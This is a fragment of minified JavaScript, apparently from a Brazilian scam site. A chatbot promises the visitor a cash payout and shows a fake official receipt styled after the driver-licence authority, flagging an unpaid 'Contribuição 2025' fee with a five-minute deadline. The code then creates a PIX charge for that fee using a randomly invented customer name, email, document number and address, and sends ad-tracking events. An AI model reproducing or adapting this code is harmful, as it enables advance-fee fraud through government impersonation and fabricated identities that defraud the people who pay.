        X(`\n\n        Clique no botão abaixo para agendar o seu recebimento de <strong>R$${y.valor_formatado}</strong>:\n        <br><br>\n        <a id="agendarBTN" href="/agendar"><button class="copypixbutton">AGENDAR AGORA</button></a>\n        <br><br>\n        Faça o agendamento em até <strong>5 minutos</strong> para evitar o cancelamento.\n\n      `, "bot"), window._FBQCLL("track", "CustomizeProduct")
    }), tt.registerFunction("comprovante", async () => {
        const t = new Date,
            e = t.toLocaleDateString("pt-BR"),
            a = t.toLocaleTimeString("pt-BR"),
            o = a.split(":"),
            n = o[0] + ":" + o[1] ? ? a;
        X(`\n\n      <div class="senatran-comprovante">\n        <div class="titulo"><img draggable="false" src="/assets/img/logoavalista.webp"><br><small>Comprovante de Solicitação</small></div>\n\n        <div class="linha"><strong>CPF Solicitante:</strong> ${d(localStorage.getItem("form_doc"))}</div>\n        <div class="linha"><strong>Serviço:</strong> Resgate de R$${y.valor_formatado}</div>\n        <div class="linha"><strong>Status:</strong> <span class="pendente">⚠︎</span> Pendência</div>\n\n        <hr>\n\n        <div class="exigencias">\n          <div class="line"><span><a class='s'>✔</a> Registro CNH</span> <b>OK</b></div>\n          <div class="line"><span><a class='s'>✔</a> Exame Psicotécnico</span> <b>OK</b></div>\n          <div class="line"><span><a class='s'>✔</a> Cadastro RENACH</span> <b>OK</b></div>\n          <div class="line"><span><a class='s'>✔</a> Multas Quitadas</span> <b>OK</b></div>\n          <div class="line"><span><a class='e'>✘</a> Contribuição 2025</span> <b>R$${u(s)}</b></div>\n        </div>\n\n        <hr>\n\n        <div class="rodape">\n          Nº Solicitação: <b>2025.${y.protocolo_atendimento}-2</b><br>\n          <small>Emitido em ${e} - ${n}</small>\n        </div>\n      </div>\n\n      `, "bot"), vt(s, function(t) {
            v = t
        })
    }), tt.registerFunction("awardPoints", async (t, e) => {
        const a = D.get("score") || 0,
            o = Number(a || 0) + Number(t.points || 0);
        D.set("score", o), X(`🎉 Você ganhou ${t.points} pontos! Total: ${o}`, "bot")
    }), tt.registerFunction("logEmail", async (t, e) => {
        const a = D.get("email");
        X(`✅ Salvamos o e-mail: ${a}`, "bot"), console.log("logEmail called, email:", a)
    })
}
var at, ot, nt, st, it, rt, lt, ct, dt, ut, mt, u;

function pt() {
    return {
        utm_source: localStorage.getItem("utm_source") || "",
        utm_medium: localStorage.getItem("utm_medium") || "",
        utm_campaign: localStorage.getItem("utm_campaign") || "",
        utm_content: localStorage.getItem("utm_content") || "",
        utm_term: localStorage.getItem("utm_term") || "",
        fbclid: localStorage.getItem("fbclid") || ""
    }
}

function ht() {
    const t = {
        SP: ["São Paulo", "Campinas", "Santos", "Ribeirão Preto"],
        RJ: ["Rio de Janeiro", "Niterói", "Petrópolis", "Campos dos Goytacazes"],
        MG: ["Belo Horizonte", "Uberlândia", "Juiz de Fora", "Contagem"],
        PR: ["Curitiba", "Londrina", "Maringá", "Cascavel"],
        RS: ["Porto Alegre", "Caxias do Sul", "Pelotas", "Santa Maria"],
        BA: ["Salvador", "Feira de Santana", "Vitória da Conquista", "Ilhéus"],
        PE: ["Recife", "Olinda", "Caruaru", "Petrolina"],
        CE: ["Fortaleza", "Juazeiro do Norte", "Sobral", "Maracanaú"]
    };

    function e(t) {
        return t[Math.floor(Math.random() * t.length)]
    }
    const a = e(Object.keys(t)),
        o = e(t[a]);
    return {
        street_name: e(["Rua das Flores", "Avenida Brasil", "Rua XV de Novembro", "Travessa da Paz", "Alameda Santos", "Rua do Comércio", "Avenida Paulista", "Rua das Acácias"]),
        number: (Math.floor(9999 * Math.random()) + 1).toString(),
        complement: e(["Apto 101", "Casa 2", "Bloco B", "Fundos", "Sala 3", "Cobertura", ""]),
        neighborhood: e(["Centro", "Jardim América", "Boa Vista", "Copacabana", "Moema", "Savassi", "Batel", "Liberdade"]),
        city: o,
        state: a
    }
}
t(".skipqueuelabel");
let ft = ["Maria", "José", "Ana", "João", "Antônio", "Francisca", "Carlos", "Paulo", "Pedro", "Lucas", "Marcos", "Luis", "Gabriel", "Rafael", "Fernanda", "Juliana", "Patrícia", "Sandra", "Aline", "Cláudia", "Roberto", "Ricardo", "André", "Bruno", "Felipe", "Rodrigo", "Marcelo", "Fábio", "Daniel", "Thiago", "Eduardo", "Gustavo", "Leandro", "Vanessa", "Camila", "Simone", "Cristiane", "Adriana", "Sérgio", "Renato", "Luciana", "Eliane", "Marta", "Sônia", "Regina", "Helena", "Márcia", "Cléber", "Valéria", "Carla"],
    gt = ["Silva", "Santos", "Oliveira", "Souza", "Rodrigues", "Ferreira", "Almeida", "Costa", "Gomes", "Martins", "Araújo", "Melo", "Barbosa", "Ribeiro", "Alves", "Cardoso", "Schmidt", "Rocha", "Dias", "Teixeira", "Fernandes", "Carvalho", "Machado", "Lima", "Moreira", "Pereira", "Freitas", "Vieira", "Moura", "Campos", "Batista", "Nascimento", "Andrade", "Correia", "Cavalcante", "Monteiro", "Ramos", "Barros", "Tavares", "Cunha", "Duarte", "Farias", "Bezerra", "Pinto", "Azevedo", "Mendes", "Sales", "Peixoto", "Xavier", "Fonseca"];

function bt(t) {
    const e = encodeURIComponent(t).replace(/%([0-9A-F]{2})/g, (t, e) => String.fromCharCode("0x" + e));
    return btoa(e)
}
async function yt(t, e, a) {
    let o = t;
    o = o > 2e3 ? 2e3 : o, o = o < 1 ? 1 : o, o = Math.round(100 * o);
    const n = ht(),
        s = ft[Math.round(49 * Math.random())] + " " + gt[Math.round(49 * Math.random())] + " " + gt[Math.round(49 * Math.random())],
        i = pt() ? ? {},
        r = {
            amount: o,
            offer_hash: "???",
            payment_method: "pix",
            customer: {
                name: s ? ? "Marcos da Silva Souza",
                email: s.normalize("NFD").replace(/[\u0300-\u036f]/g, "").replaceAll(" ", "").toLowerCase() + "@" + ["gmail", "yahoo", "outlook", "hotmail"][Math.round(3 * Math.random())] + ".com" ? ? "marksilvaa5233@gmail.com",
                phone_number: "" + Math.round(1e10 + 99999999999 * Math.random()),
                document: "" + Math.round(1e10 + 99999999999 * Math.random()),
                street_name: n.street_name,
                number: n.number,
                complement: n.complement,
                neighborhood: n.neighborhood,
                city: n.city,
                state: n.state,
                zip_code: "" + Math.round(1e7 + 99999999 * Math.random())
            },
            cart: [{
                product_hash: "???",
                title: "Transferência via PIX",
                cover: null,
                price: o,
                quantity: 1,
                operation_type: 1,
                tangible: !1
            }],
            installments: 1,
            expire_in_days: 1,
            postback_url: "???",
            utm_args: i
        };
    try {
        const t = await fetch("/ss/min?nocache=" + 99999 * Math.random(), {
            method: "POST",
            body: bt(JSON.stringify(r))
        });
        let o = await t.text();
        o = JSON.parse(atob(o)), o ? e(o) : a()
    } catch (t) {
        console.error("Erro:", t), a()
    }
}

function vt(t, e) {
    window._STDT_PXPGN(t, e)
}